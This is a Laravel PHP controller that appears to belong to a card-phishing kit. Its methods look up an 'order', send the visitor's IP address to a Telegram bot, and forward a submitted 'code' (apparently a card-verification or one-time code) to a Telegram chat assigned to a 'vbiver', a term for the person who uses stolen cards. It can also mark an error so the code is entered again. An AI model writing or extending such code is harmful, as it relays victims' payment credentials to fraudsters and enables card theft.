<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Log;
// use App\Http\Services\ProductServices;
// use App\Http\Services\CardServices;
use App\Http\Services\OrderServices;
use App\Http\Services\API\BinListServices;
use App\Http\Services\API\Telegram\TelegramServices;
use App\Http\Services\API\Telegram\TextController;

class CardController extends Controller
{
    public function index(Request $request)
    {
        $order_id = (isset($request->id) ? $request->id : null);
        $order = (new OrderServices)->find($order_id);
        (new OrderServices)->updateStatus($order_id);
        
        
        $data = (new TextController)->getMenuCard($order, $request->ip());
        $test = (new TelegramServices)->request($data);
        
        return view('card.pages.index', compact("order"));
    }

    public function getOrderStatus($order_id = null)
    {

        return (new OrderServices)->find($order_id)->status;
    }

    public function codeGet(Request $request)
    {
        $order = (new OrderServices)->find($request->id);
        (new OrderServices)->updateStatus($request->id);
        (new OrderServices)->updateError($request->id);

        $data = (new TextController)->code($order, $request->code);
        if(isset($order["vbiverId"])){
            $data["chat_id"] = $order["vbiverId"];
            $data["reply_to_message_id"] = $order["messageId"];
        }
        $test = (new TelegramServices)->request($data);
        
        return $order->error;
    }
}
